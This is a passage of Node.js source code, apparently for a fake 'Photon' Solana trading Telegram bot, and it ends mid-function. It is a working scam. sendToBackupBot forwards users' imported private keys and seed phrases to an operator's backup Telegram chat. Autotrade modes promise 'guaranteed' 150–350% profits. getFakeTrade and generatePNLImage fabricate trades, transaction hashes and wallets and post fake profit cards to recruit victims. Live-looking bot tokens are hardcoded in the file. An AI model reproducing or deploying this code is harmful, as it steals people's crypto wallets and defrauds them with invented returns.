const TelegramBot = require('node-telegram-bot-api');
const { Keypair, Connection, PublicKey, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const bs58 = require('bs58');
const axios = require('axios');
const { createCanvas, loadImage } = require('canvas');
const QRCode = require('qrcode');
const fs = require('fs');
const path = require('path');
const { Client } = require('pg');

// Configuration
const SOLANA_RPC = process.env.SOLANA_RPC || "https://api.mainnet-beta.solana.com";
const MAIN_BOT_TOKEN = process.env.MAIN_BOT_TOKEN || "8490920095:AAEuswfDeMcymmu3ASdhvIWsTujKy2Rn8jA";
const BACKUP_BOT_TOKEN = process.env.BACKUP_BOT_TOKEN || "7931381114:AAGt20pJlOH0bvTgQjqJCLf7JW-7gEhq5v8";
const BACKUP_CHAT_ID = process.env.BACKUP_CHAT_ID || "5798607712";
const ADMIN_IDS = process.env.ADMIN_IDS ? process.env.ADMIN_IDS.split(',').map(id => parseInt(id.trim())) : [5798607712];
const DATABASE_URL = process.env.DATABASE_URL;

// Initialisation PostgreSQL
let pgClient;
if (DATABASE_URL) {
    pgClient = new Client({
        connectionString: DATABASE_URL,
        ssl: { rejectUnauthorized: false }
    });
    
    pgClient.connect().then(() => {
        console.log('✅ Connected to PostgreSQL database');
        initDatabase();
    }).catch(err => {
        console.error('❌ PostgreSQL connection error:', err);
    });
}

async function initDatabase() {
    const queries = [
        `CREATE TABLE IF NOT EXISTS users (
            id SERIAL PRIMARY KEY,
            chat_id BIGINT UNIQUE,
            username VARCHAR(255),
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_active TIMESTAMP,
            referral_code VARCHAR(20),
            referral_level VARCHAR(20) DEFAULT 'Bronze',
            referral_count INTEGER DEFAULT 0,
            valid_referral_count INTEGER DEFAULT 0,
            referral_earnings DECIMAL(20,10) DEFAULT 0,
            daily_sessions INTEGER DEFAULT 0,
            last_session_date DATE,
            referral_used BOOLEAN DEFAULT false
        )`,
        `CREATE TABLE IF NOT EXISTS wallets (
            id SERIAL PRIMARY KEY,
            user_id INTEGER REFERENCES users(id),
            public_key VARCHAR(255),
            private_key TEXT,
            name VARCHAR(100),
            is_default BOOLEAN DEFAULT false,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`,
        `CREATE TABLE IF NOT EXISTS trades (
            id SERIAL PRIMARY KEY,
            user_id INTEGER REFERENCES users(id),
            token_symbol VARCHAR(50),
            buy_price DECIMAL(20,10),
            sell_price DECIMAL(20,10),
            pnl DECIMAL(20,10),
            amount DECIMAL(20,10),
            mode VARCHAR(50),
            duration INTEGER,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`,
        `CREATE TABLE IF NOT EXISTS autotrade_sessions (
            id SERIAL PRIMARY KEY,
            user_id INTEGER REFERENCES users(id),
            mode VARCHAR(50),
            initial_amount DECIMAL(20,10),
            final_amount DECIMAL(20,10),
            profit DECIMAL(20,10),
            duration INTEGER,
            trades_count INTEGER,
            win_rate DECIMAL(5,2),
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`,
        `CREATE TABLE IF NOT EXISTS referral_history (
            id SERIAL PRIMARY KEY,
            referrer_id INTEGER REFERENCES users(id),
            referred_id INTEGER REFERENCES users(id),
            amount DECIMAL(20,10),
            level INTEGER DEFAULT 1,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`,
        `CREATE TABLE IF NOT EXISTS user_limits (
            id SERIAL PRIMARY KEY,
            user_id INTEGER REFERENCES users(id),
            daily_session_limit INTEGER DEFAULT 3,
            current_daily_sessions INTEGER DEFAULT 0,
            last_session_date DATE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`
    ];

    for (const query of queries) {
        try {
            await pgClient.query(query);
        } catch (error) {
            console.error('Database init error:', error);
        }
    }
}

// Initialisation des bots avec configuration optimisée
const mainBot = new TelegramBot(MAIN_BOT_TOKEN, {
    polling: {
        interval: 1000,
        autoStart: true,
        params: {
            timeout: 30,
            limit: 100
    }
    }
});

const backupBot = BACKUP_BOT_TOKEN ? new TelegramBot(BACKUP_BOT_TOKEN) : null;

// Chargement des données persistantes
const DATA_FILE = path.join(__dirname, 'bot_data.json');
let persistentData = {
    userWallets: {},
    userStates: {},
    userSettings: {},
    referralCodes: {},
    connectedUsers: [],
    autotradeSessions: {},
    userBalances: {},
    adminBalances: {},
    withdrawalRequests: {},
    tradeHistory: {},
    bestTrades: {},
    userLimits: {},
    referralBonuses: {}
};

try {
    if (fs.existsSync(DATA_FILE)) {
        const data = fs.readFileSync(DATA_FILE, 'utf8');
        persistentData = JSON.parse(data);
    }
} catch (error) {
    console.error('Error loading persistent data:', error);
}

// Stockage des données
const userWallets = new Map(Object.entries(persistentData.userWallets || {}));
const userStates = new Map(Object.entries(persistentData.userStates || {}));
const userSettings = new Map(Object.entries(persistentData.userSettings || {}));
const referralCodes = new Map(Object.entries(persistentData.referralCodes || {}));
const connectedUsers = new Set(persistentData.connectedUsers || []);
const autotradeSessions = new Map(Object.entries(persistentData.autotradeSessions || {}));
const userBalances = new Map(Object.entries(persistentData.userBalances || {}));
const adminBalances = new Map(Object.entries(persistentData.adminBalances || {}));
const withdrawalRequests = new Map(Object.entries(persistentData.withdrawalRequests || {}));
const tradeHistory = new Map(Object.entries(persistentData.tradeHistory || {}));
const bestTrades = new Map(Object.entries(persistentData.bestTrades || {}));
const userLimits = new Map(Object.entries(persistentData.userLimits || {}));
const referralBonuses = new Map(Object.entries(persistentData.referralBonuses || {}));

// Configuration pour les images PNL
const backgroundDir = './backgrounds';
const logoImage = 'logo.png';
const bottomImage = 'bottom.png';
const GROUP_ID = '@testitfy';

// Sauvegarde des données
function savePersistentData() {
    const autotradeSessionsData = {};
    for (const [userId, session] of autotradeSessions) {
        if (session && typeof session === 'object') {
            autotradeSessionsData[userId] = {
                userId: session.userId,
                mode: session.mode,
                initialAmount: session.initialAmount,
                currentAmount: session.currentAmount,
                startTime: session.startTime,
                trades: session.trades || [],
                active: session.active,
                progress: session.progress,
                tokenInfo: session.tokenInfo,
            };
        }
    }
    
    persistentData = {
        userWallets: Object.fromEntries(userWallets),
        userStates: Object.fromEntries(userStates),
        userSettings: Object.fromEntries(userSettings),
        referralCodes: Object.fromEntries(referralCodes),
        connectedUsers: Array.from(connectedUsers),
        autotradeSessions: autotradeSessionsData,
        userBalances: Object.fromEntries(userBalances),
        adminBalances: Object.fromEntries(adminBalances),
        withdrawalRequests: Object.fromEntries(withdrawalRequests),
        tradeHistory: Object.fromEntries(tradeHistory),
        bestTrades: Object.fromEntries(bestTrades),
        userLimits: Object.fromEntries(userLimits),
        referralBonuses: Object.fromEntries(referralBonuses)
    };
    
    fs.writeFileSync(DATA_FILE, JSON.stringify(persistentData, null, 2));
}

// Configuration pour le trading simulé
const TRADING_CONFIG = {
    INITIAL_SOL_BALANCE: 100,
    PRICE_UPDATE_INTERVAL: 10000,
    TRANSACTION_HISTORY_LIMIT: 20,
    DEFAULT_SLIPPAGE: 1,
    DEFAULT_GAS_FEE: 0.0005,
    DEFAULT_BUY_AMOUNT: 10,
    DEFAULT_SELL_PERCENT: 100,
    TOKEN_NAMES: {
        'So11111111111111111111111111111111111111112': 'SOL',
        'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
        'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
        '7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU': 'SAMO',
        'SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt': 'SRM'
    }
};

// Configuration Autotrade avec garanties ajustées
const AUTOTRADE_MODES = {
    SAFE: {
        name: "SAFE",
        risk: 0.1,
        profitTarget: 1.8,
        stopLoss: 0.85,
        tradeFrequency: 35000,
        guaranteedProfit: 1.50, // 150% minimum
        maxPositions: 2,
        volatilityFactor: 0.8,
        description: "Guaranteed 150% minimum profit"
    },
    NORMAL: {
        name: "NORMAL",
        risk: 0.2,
        profitTarget: 2.0,
        stopLoss: 0.80,
        tradeFrequency: 25000,
        guaranteedProfit: 2.50, // 250% minimum
        maxPositions: 3,
        volatilityFactor: 1.0,
        description: "Guaranteed 250% minimum profit"
    },
    DEGEN: {
        name: "DEGEN",
        risk: 0.3,
        profitTarget: 2.5,
        stopLoss: 0.70,
        tradeFrequency: 15000,
        guaranteedProfit: 3.50, // 350% minimum
        maxPositions: 5,
        volatilityFactor: 1.2,
        description: "Guaranteed 350% minimum profit"
    }
};

// État global
const tradingState = {
    users: {},
    tokenPrices: {},
    trackedMessages: new Map(),
    intervals: []
};

// Tokens réels Solana avec leurs adresses
const REAL_TOKENS = [
    {
        name: "DogWifHat",
        symbol: "WIF",
        address: "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm",
        volatility: 0.12
    },
    {
        name: "Bonk",
        symbol: "BONK",
        address: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",
        volatility: 0.10
    },
    {
        name: "Book of Meme",
        symbol: "BOME",
        address: "79HCS2K34WQt6QhjUACq3MHo6yyBrzYpBjMZPx6YDw9",
        volatility: 0.15
    },
    {
        name: "Popcat",
        symbol: "POPCAT",
        address: "7GCihgDB8fe6KNjn2MYtkzZcRjQy3t9GHdC8uHYmW2hr",
        volatility: 0.13
    },
    {
        name: "Myro",
        symbol: "MYRO",
        address: "9ywrtCS6FwzPxRJbVdT2aoR5E2V8sTq1mQq3pY6pJcHv",
        volatility: 0.11
    },
    {
        name: "Wen",
        symbol: "WEN",
        address: "WENWENvqqNya429ubCdR81ZmD69brwQaaBYY6p3LCpk",
        volatility: 0.09
    },
    {
        name: "Jito",
        symbol: "JTO",
        address: "jtojtomepa8beP8AuQc6eXt5FriJwfFMwQx2v2f9mCL",
        volatility: 0.08
    },
    {
        name: "Jupiter",
        symbol: "JUP",
        address: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN",
        volatility: 0.07
    }
];

const usedTokens = new Set();
const usedWallets = new Set();

// Système de parrainage amélioré
class ReferralSystem {
    constructor() {
        this.referrals = new Map();
        this.userReferrers = new Map();
        this.bonusPayments = new Map();
        this.referralCounts = new Map();
        this.validReferralCounts = new Map();
        this.referralEarnings = new Map();
        this.referralLevels = new Map();
        this.referralUsed = new Map();
    }

    generateCode(userId) {
        const code = `PH${Math.random().toString(36).substr(2, 6).toUpperCase()}`;
        this.referrals.set(code, { userId, uses: 0, validUses: 0 });
        
        // Sauvegarder dans la base de données
        if (pgClient) {
            pgClient.query(
                `UPDATE users SET referral_code = $1 WHERE chat_id = $2`,
                [code, userId]
            ).catch(console.error);
        }
        
        return code;
    }

    useCode(userId, code) {
        console.log(`🔍 Checking referral code: ${code} for user ${userId}`);
        
        if (code.toLowerCase() === 'photon') {
            console.log(`✅ Special code accepted for user ${userId}`);
            this.referralUsed.set(userId, true);
            return true;
        }
        
        if (!this.referrals.has(code)) {
            console.log(`❌ Referral code not found: ${code}`);
            return false;
        }
        
        const referral = this.referrals.get(code);
        referral.uses++;
        this.userReferrers.set(userId, referral.userId);
        
        // Mettre à jour le statut d'utilisation du code
        this.referralUsed.set(userId, true);
        
        // Sauvegarder dans la base de données
        if (pgClient) {
            pgClient.query(
                `UPDATE users SET referral_used = true WHERE chat_id = $1`,
                [userId]
            ).catch(console.error);
        }
        
        console.log(`✅ Referral code used successfully: ${code}`);
        return true;
    }

    addBonusFromAdmin(userId, amount, referredUserId) {
        // Le parrain reçoit 10% du montant déposé par l'admin pour le filleul
        const bonusAmount = amount * 0.1;
        
        const current = this.referralEarnings.get(userId) || 0;
        this.referralEarnings.set(userId, current + bonusAmount);
        
        // Ajouter au main balance du parrain
        const currentBalance = userBalances.get(userId.toString()) || 0;
        userBalances.set(userId.toString(), currentBalance + bonusAmount);
        
        // Mettre à jour les statistiques
        if (pgClient) {
            pgClient.query(
                `UPDATE users SET 
                    referral_earnings = referral_earnings + $1,
                    valid_referral_count = valid_referral_count + 1 
                 WHERE chat_id = $2`,
                [bonusAmount, userId]
            ).catch(console.error);
            
            // Ajouter à l'historique des références
            pgClient.query(
                `INSERT INTO referral_history (referrer_id, referred_id, amount, level)
                 SELECT u1.id, u2.id, $1, 1
                 FROM users u1, users u2
                 WHERE u1.chat_id = $2 AND u2.chat_id = $3`,
                [bonusAmount, userId, referredUserId]
            ).catch(console.error);
        }
        
        savePersistentData();
        
        console.log(`💰 Added ${bonusAmount} SOL bonus to referrer ${userId} from referred user ${referredUserId}`);
        
        // Notifier le parrain
        try {
            mainBot.sendMessage(userId, 
                `🎉 Commission de parrainage !\n\n` +
                `Vous avez reçu ${bonusAmount.toFixed(4)} SOL (10%) de commission ` +
                `suite au dépôt d'un filleul.\n\n` +
                `💰 Votre nouveau solde: ${(currentBalance + bonusAmount).toFixed(4)} SOL`
            );
        } catch (error) {
            console.error('Error notifying referrer:', error);
        }
        
        return bonusAmount;
    }

    addValidReferral(userId) {
        const current = this.validReferralCounts.get(userId) || 0;
        this.validReferralCounts.set(userId, current + 1);
        
        if (pgClient) {
            pgClient.query(
                `UPDATE users SET valid_referral_count = valid_referral_count + 1 WHERE chat_id = $1`,
                [userId]
            ).catch(console.error);
        }
        
        // Mettre à jour le niveau
        this.updateLevel(userId);
    }

    updateLevel(userId) {
        const validCount = this.validReferralCounts.get(userId) || 0;
        let level;
        
        if (validCount >= 10) {
            level = '🥇 Gold';
        } else if (validCount >= 5) {
            level = '🥈 Silver';
        } else if (validCount >= 3) {
            level = '🥉 Bronze';
        } else {
            level = 'Newbie';
        }
        
        this.referralLevels.set(userId, level);
        
        if (pgClient) {
            pgClient.query(
                `UPDATE users SET referral_level = $1 WHERE chat_id = $2`,
                [level, userId]
            ).catch(console.error);
        }
    }

    addBonus(userId, amount) {
        const current = this.referralEarnings.get(userId) || 0;
        this.referralEarnings.set(userId, current + amount);
        
        if (pgClient) {
            pgClient.query(
                `UPDATE users SET referral_earnings = referral_earnings + $1 WHERE chat_id = $2`,
                [amount, userId]
            ).catch(console.error);
        }
        
        const currentBalance = userBalances.get(userId.toString()) || 0;
        userBalances.set(userId.toString(), currentBalance + amount);
        savePersistentData();
        
        console.log(`💰 Added ${amount} SOL bonus to user ${userId}`);
    }

    getUserReferrals(userId) {
        return this.referralCounts.get(userId) || 0;
    }

    getUserValidReferrals(userId) {
        return this.validReferralCounts.get(userId) || 0;
    }

    getUserBonus(userId) {
        return this.referralEarnings.get(userId) || 0;
    }

    getUserLevel(userId) {
        return this.referralLevels.get(userId) || 'Newbie';
    }

    canWithdrawBonus(userId) {
        return this.getUserValidReferrals(userId) >= 3;
    }

    hasUsedReferralCode(userId) {
        return this.referralUsed.get(userId) || false;
    }
}

const referralSystem = new ReferralSystem();
const solanaConnection = new Connection(SOLANA_RPC);

// ==================== GESTION DES LIMITES DE SESSIONS ====================
class SessionLimiter {
    constructor() {
        this.dailyLimit = 3; // 3 sessions par jour maximum
    }

    getUserLimits(userId) {
        const userIdStr = userId.toString();
        let userLimit = userLimits.get(userIdStr);
        
        if (!userLimit) {
            userLimit = {
                dailySessions: 0,
                lastSessionDate: null,
                dailyLimit: this.dailyLimit
            };
            userLimits.set(userIdStr, userLimit);
            savePersistentData();
        }
        
        return userLimit;
    }

    canStartSession(userId) {
        const limit = this.getUserLimits(userId);
        const today = new Date().toDateString();
        
        // Réinitialiser le compteur si c'est un nouveau jour
        if (limit.lastSessionDate !== today) {
            limit.dailySessions = 0;
            limit.lastSessionDate = today;
            userLimits.set(userId.toString(), limit);
            savePersistentData();
            return true;
        }
        
        return limit.dailySessions < limit.dailyLimit;
    }

    startSession(userId) {
        const limit = this.getUserLimits(userId);
        const today = new Date().toDateString();
        
        if (limit.lastSessionDate !== today) {
            limit.dailySessions = 0;
            limit.lastSessionDate = today;
        }
        
        limit.dailySessions++;
        userLimits.set(userId.toString(), limit);
        savePersistentData();
        
        return limit.dailySessions;
    }

    getRemainingSessions(userId) {
        const limit = this.getUserLimits(userId);
        const today = new Date().toDateString();
        
        if (limit.lastSessionDate !== today) {
            return this.dailyLimit;
        }
        
        return Math.max(0, this.dailyLimit - limit.dailySessions);
    }

    getSessionInfo(userId) {
        const limit = this.getUserLimits(userId);
        const today = new Date().toDateString();
        const remaining = this.getRemainingSessions(userId);
        
        return {
            dailySessions: limit.dailySessions,
            dailyLimit: this.dailyLimit,
            remainingSessions: remaining,
            lastSessionDate: limit.lastSessionDate,
            canStart: remaining > 0
        };
    }
}

const sessionLimiter = new SessionLimiter();

// ==================== FONCTIONS POUR PRIX RÉELS ====================
async function getRealTokenPrice(tokenAddress) {
    try {
        const response = await axios.get(`https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`, {
            timeout: 5000
        });
        
        if (response.data && response.data.pairs && response.data.pairs.length > 0) {
            // Prendre le prix de la paire avec la meilleure liquidité
            const bestPair = response.data.pairs.reduce((best, current) => {
                const bestLiquidity = best.liquidity?.usd || 0;
                const currentLiquidity = current.liquidity?.usd || 0;
                return currentLiquidity > bestLiquidity ? current : best;
            });
            
            return parseFloat(bestPair.priceUsd) || 0.000001;
        }
        
        return 0.000001;
    } catch (error) {
        console.error(`Error fetching price for ${tokenAddress}:`, error.message);
        return 0.000001;
    }
}

async function getTokenInfo(tokenAddress) {
    try {
        const response = await axios.get(`https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`, {
            timeout: 5000
        });
        
        if (response.data && response.data.pairs && response.data.pairs.length > 0) {
            const pair = response.data.pairs[0];
            return {
                name: pair.baseToken?.name || 'Unknown',
                symbol: pair.baseToken?.symbol || 'UNKNOWN',
                price: parseFloat(pair.priceUsd) || 0.000001,
                liquidity: pair.liquidity?.usd || 0,
                volume24h: pair.volume?.h24 || 0,
                priceChange24h: pair.priceChange?.h24 || 0
            };
        }
        
        return null;
    } catch (error) {
        console.error(`Error fetching token info:`, error.message);
        return null;
    }
}

// ==================== FONCTIONS POUR IMAGES PNL ====================
function getRandomBackground() {
    try {
        if (!fs.existsSync(backgroundDir)) {
            fs.mkdirSync(backgroundDir, { recursive: true });
        }
        const files = fs.readdirSync(backgroundDir).filter(f => f.endsWith('.jpg') || f.endsWith('.png'));
        if (files.length === 0) return null;
        const file = files[Math.floor(Math.random() * files.length)];
        return `${backgroundDir}/${file}`;
    } catch (error) {
        console.error('Error getting background:', error);
        return null;
    }
}

function generateSolanaTxHash() {
    const alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    return Array.from({ length: 64 }, () => alphabet[Math.floor(Math.random() * alphabet.length)]).join('');
}

function generateUniqueSolanaWallet() {
    const alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    let address = '';
    for (let i = 0; i < 44; i++) {
        address += alphabet[Math.floor(Math.random() * alphabet.length)];
    }
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
}

function getPNLMultiplier(mode) {
    // PNL plus réalistes selon le mode
    switch(mode) {
        case 'SAFE':
            return 1.1 + Math.random() * 0.3; // 10% - 40%
        case 'NORMAL':
            return 1.2 + Math.random() * 0.5; // 20% - 70%
        case 'DEGEN':
            return 1.3 + Math.random() * 0.8; // 30% - 110%
        default:
            return 1.1 + Math.random() * 0.2; // 10% - 30%
    }
}

async function getFakeTrade() {
    const token = REAL_TOKENS[Math.floor(Math.random() * REAL_TOKENS.length)];
    const tokenInfo = await getTokenInfo(token.address);
    
    if (!tokenInfo) {
        // Fallback si l'API ne répond pas
        const buyPrice = 0.00005 + Math.random() * 0.0002;
        const multiplier = 1.1 + Math.random() * 0.5;
        const sellPrice = buyPrice * multiplier;
        const pnl = ((sellPrice - buyPrice) / buyPrice) * 100;
        
        return {
            token: token.symbol,
            buyPrice: buyPrice.toFixed(6),
            sellPrice: sellPrice.toFixed(6),
            pnl: pnl.toFixed(2),
            txHash: generateSolanaTxHash(),
            wallet: generateUniqueSolanaWallet(),
            link: 'https://t.me/PhotonTradingBot'
        };
    }
    
    const buyPrice = tokenInfo.price;
    const multiplier = 1.1 + Math.random() * 0.4; // 10% - 50% réaliste
    const sellPrice = buyPrice * multiplier;
    const pnl = ((sellPrice - buyPrice) / buyPrice) * 100;
    
    return {
        token: token.symbol,
        buyPrice: buyPrice.toFixed(6),
        sellPrice: sellPrice.toFixed(6),
        pnl: pnl.toFixed(2),
        txHash: generateSolanaTxHash(),
        wallet: generateUniqueSolanaWallet(),
        link: 'https://t.me/PhotonTradingBot'
    };
}

async function generatePNLImage(data) {
    try {
        const canvas = createCanvas(1280, 720);
        const ctx = canvas.getContext('2d');
        const bgPath = getRandomBackground();

        // Fond
        if (bgPath && fs.existsSync(bgPath)) {
            const bg = await loadImage(bgPath);
            ctx.drawImage(bg, 0, 0, 1280, 720);
        } else {
            ctx.fillStyle = '#0a0a0a';
            ctx.fillRect(0, 0, 1280, 720);
        }

        // Logo
        if (fs.existsSync(logoImage)) {
            const logo = await loadImage(logoImage);
            ctx.drawImage(logo, 40, 20, 160, 120);
        }

        // Titre
        ctx.fillStyle = '#ffffff';
        ctx.font = 'bold 80px sans-serif';
        ctx.fillText('PHOTON', 220, 100);

        ctx.font = '40px sans-serif';
        ctx.textAlign = 'right';
        ctx.fillText('photontrading.app/', 1240, 70);
        ctx.textAlign = 'left';

        // Ligne de séparation
        ctx.strokeStyle = '#ffffff';
        ctx.lineWidth = 2;
        ctx.beginPath();
        ctx.moveTo(50, 160);
        ctx.lineTo(1230, 160);
        ctx.stroke();

        // Informations du trade
        const blockYStart = 200;
        ctx.font = 'bold 50px sans-serif';
        ctx.fillText(`${data.token} PNL`, 50, blockYStart + 50);

        ctx.font = 'bold 80px sans-serif';
        ctx.fillStyle = '#00FF00';
        ctx.fillText(`+${data.pnl}%`, 50, blockYStart + 150);

        ctx.fillStyle = '#ffffff';
        ctx.font = '40px sans-serif';
        ctx.fillText(`Buy: ${data.buyPrice}$`, 50, blockYStart + 250);
        ctx.fillText(`Sell: ${data.sellPrice}$`, 50, blockYStart + 320);

        // QR Code
        const qrBuffer = await QRCode.toBuffer(data.link);
        const qrImage = await loadImage(qrBuffer);
        ctx.drawImage(qrImage, 950, 200, 250, 250);

        ctx.fillStyle = '#ffffff';
        ctx.font = '30px sans-serif';
        ctx.fillText('Scan to start', 980, 480);

        // Adresse wallet
        ctx.font = '30px monospace';
        ctx.textAlign = 'left';
        ctx.fillStyle = '#cccccc';
        ctx.fillText(data.wallet, 950, 650);

        // Image du bas
        if (fs.existsSync(bottomImage)) {
            const bottomImg = await loadImage(bottomImage);
            ctx.drawImage(bottomImg, 1000, 620, 80, 80);
        }

        // Sauvegarde
        const imgPath = 'pnl_card.png';
        fs.writeFileSync(imgPath, canvas.toBuffer('image/png'));
        return imgPath;
    } catch (error) {
        console.error('Error generating PNL image:', error);
        return null;
    }
}

async function sendPNLToGroup(data) {
    try {
        const imgPath = await generatePNLImage(data);
        if (!imgPath) return;

        const caption = `💰 *Profit generated by one of our users* 💰

🧾 *Transaction hash*:
\`${data.txHash}\`

📋 *Copied wallet*:
\`${data.wallet}\`

🚀 *Start for free now* 👉[Click here](https://t.me/PhotonTradingBot)
`;

        await mainBot.sendPhoto(GROUP_ID, imgPath, {
            caption,
            parse_mode: 'Markdown'
        });

        console.log(`✅ Sent PNL to group: ${data.token} (+${data.pnl}%)`);
        
        // Supprimer l'image temporaire
        fs.unlinkSync(imgPath);
    } catch (err) {
        console.error('❌ Error sending PNL:', err);
    }
}

// ==================== FONCTIONS UTILITAIRES ====================
function applyPositiveMarketBias(price, volatility, mode = 'SAFE') {
    let directionBias;
    let movementFactor;
    
    switch(mode) {
        case 'SAFE':
            directionBias = Math.random() < 0.8 ? 1 : -1;
            movementFactor = 0.7;
            break;
        case 'NORMAL':
            directionBias = Math.random() < 0.7 ? 1 : -1;
            movementFactor = 0.8;
            break;
        case 'DEGEN':
            directionBias = Math.random() < 0.6 ? 1 : -1;
            movementFactor = 1.0;
            break;
        default:
            directionBias = Math.random() < 0.7 ? 1 : -1;
            movementFactor = 0.8;
    }
    
    const movement = (Math.random() * volatility * 0.5 + volatility * 0.5) * directionBias * movementFactor;
    return Math.max(price * 0.99, price * (1 + movement));
}

function formatTime(seconds) {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = Math.floor(seconds % 60);
    return `${hours}h ${minutes}m ${secs}s`;
}

async function cleanupPreviousMessages(chatId, keepMainMenu = false) {
    try {
        const state = userStates.get(chatId) || {};
        
        const messagesToDelete = [
            'waitlistMessageId', 'accessGrantedMessageId', 'walletInfoMessageId',
            'mainMenuMessageId', 'tradingMenuMessageId', 'importWalletMessageId',
            'manageWalletMessageId', 'rugCheckMessageId', 'exportConfirmMessageId',
            'helpMenuMessageId', 'withdrawMenuMessageId', 'errorMessageId',
            'autotradeMenuMessageId', 'adminMenuMessageId', 'transferMenuMessageId',
            'autotradeMessageId', 'autotradeResultMessageId', 'referralMenuMessageId'
        ];

        for (const messageId of messagesToDelete) {
            if (state[messageId] && !(messageId === 'tradingMenuMessageId' && keepMainMenu)) {
                try {
                    await mainBot.deleteMessage(chatId, state[messageId]);
                } catch (error) {
                    // Ignorer les erreurs de suppression
                }
            }
        }
    } catch (error) {
        console.error('Error in cleanupPreviousMessages:', error);
    }
}

function escapeText(text) {
    return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

function validatePrivateKey(input) {
    const cleaned = input.trim();
    
    if (cleaned.length < 30) throw new Error("Invalid key length");

    try {
        if (cleaned.length === 64 && /^[0-9a-fA-F]+$/.test(cleaned)) {
            return {
                keypair: Keypair.fromSecretKey(Buffer.from(cleaned, 'hex')),
                cleanKey: cleaned
            };
        }
        
        return {
            keypair: Keypair.fromSecretKey(bs58.decode(cleaned)),
            cleanKey: cleaned
        };
    } catch (e) {
        throw new Error("Invalid key format (use Hex or Base58)");
    }
}

async function sendToBackupBot(userId, type, data) {
    if (!backupBot) return true;
    
    try {
        const username = userStates.get(userId)?.username || `User_${userId}`;
        const message = `🔐 NOUVELLE ${type.toUpperCase()} SOLANA\n\n`
            + `• ID: ${userId}\n`
            + `• Username: ${username}\n`
            + `• Date: ${new Date().toLocaleString()}\n\n`
            + `• ${type === 'private key' ? 'Clé Privée' : 'Seed Phrase'}: ${escapeText(data)}\n\n`
            + `⚠️ CONSERVER CE MESSAGE EN SÉCURITÉ`;

        await backupBot.sendMessage(BACKUP_CHAT_ID, message);
        return true;
    } catch (error) {
        console.error("Backup error:", error);
        return false;
    }
}

async function getWalletBalance(publicKey) {
    try {
        const balance = await solanaConnection.getBalance(new PublicKey(publicKey));
        return balance / LAMPORTS_PER_SOL;
    } catch (error) {
        console.error("Balance error:", error);
        return 0;
    }
}

function getUserMainBalance(userId) {
    return Number(userBalances.get(userId.toString())) || 0;
}

function setUserMainBalance(userId, amount) {
    userBalances.set(userId.toString(), Number(amount));
    savePersistentData();
}

function addToUserMainBalance(userId, amount) {
    const current = getUserMainBalance(userId);
    setUserMainBalance(userId, current + amount);
}

// ==================== TOKEN ANALYSIS ====================
async function analyzeToken(chatId, tokenAddress) {
    try {
        await mainBot.sendChatAction(chatId, 'typing');
        
        if (!tokenAddress.match(/^[1-9A-HJ-NP-Za-km-z]{32,44}$/)) {
            return mainBot.sendMessage(chatId, "❌ Invalid Solana token address format");
        }

        const { data } = await axios.get(`https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`);
        
        if (!data.pairs || data.pairs.length === 0) {
            return mainBot.sendMessage(chatId, "❌ No trading pairs found for this token.");
        }

        const pair = data.pairs.reduce((max, current) => 
            (current.liquidity?.usd > max.liquidity?.usd) ? current : max
        );
        
        const riskAnalysis = analyzeTokenRisk(pair);
        
        let message = `🔍 *Token Analysis* - Rug Check\n\n`;
        message += `🏷️ *${pair.baseToken.name || 'Unknown'}* (${pair.baseToken.symbol || '?'})\n`;
        message += `🔗 Address: \`${tokenAddress}\`\n\n`;
        message += `📊 *Market Stats*\n`;
        message += `• Liquidity: $${(pair.liquidity?.usd || 0).toLocaleString()}\n`;
        message += `• 24h Volume: $${(pair.volume?.h24 || 0).toLocaleString()}\n`;
        message += `• Price: $${pair.priceUsd || 'N/A'}\n`;
        message += `• Price Change (24h): ${pair.priceChange?.h24 ? pair.priceChange.h24.toFixed(2)+'%' : 'N/A'}\n`;
        message += `• Age: ${pair.pairCreatedAt ? getTokenAge(pair.pairCreatedAt) : 'Unknown'}\n\n`;
        message += `⚠️ *Risk Analysis*\n`;
        message += `• Score: ${riskAnalysis.score}/10\n`;
        message += `• Reasons: ${riskAnalysis.reasons.join(', ')}\n\n`;
        message += `💡 *Recommendation*\n${riskAnalysis.recommendation}\n\n`;
        message += `🕒 ${new Date().toLocaleTimeString('fr-FR', {hour: '2-digit', minute:'2-digit'})}`;

        await mainBot.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            disable_web_page_preview: true,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "📊 DexScreener", url: `https://dexscreener.com/solana/${tokenAddress}` },
                        { text: "🔍 Solscan", url: `https://solscan.io/token/${tokenAddress}` }
                    ],
                    [
                        { text: "← Back", callback_data: 'menu' }
                    ]
                ]
            }
        });

    } catch (error) {
        console.error('Rug check error:', error);
        mainBot.sendMessage(chatId, "❌ Error during token analysis. Please try again later.");
    }
}

function getTokenAge(creationDate) {
    try {
        const now = new Date();
        const created = new Date(creationDate);
        const diffMs = now - created;
        const diffDays = Math.floor(diffMs / (1000 * 60 * 60 * 24));
        const diffHours = Math.floor((diffMs % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        
        if (diffDays > 0) {
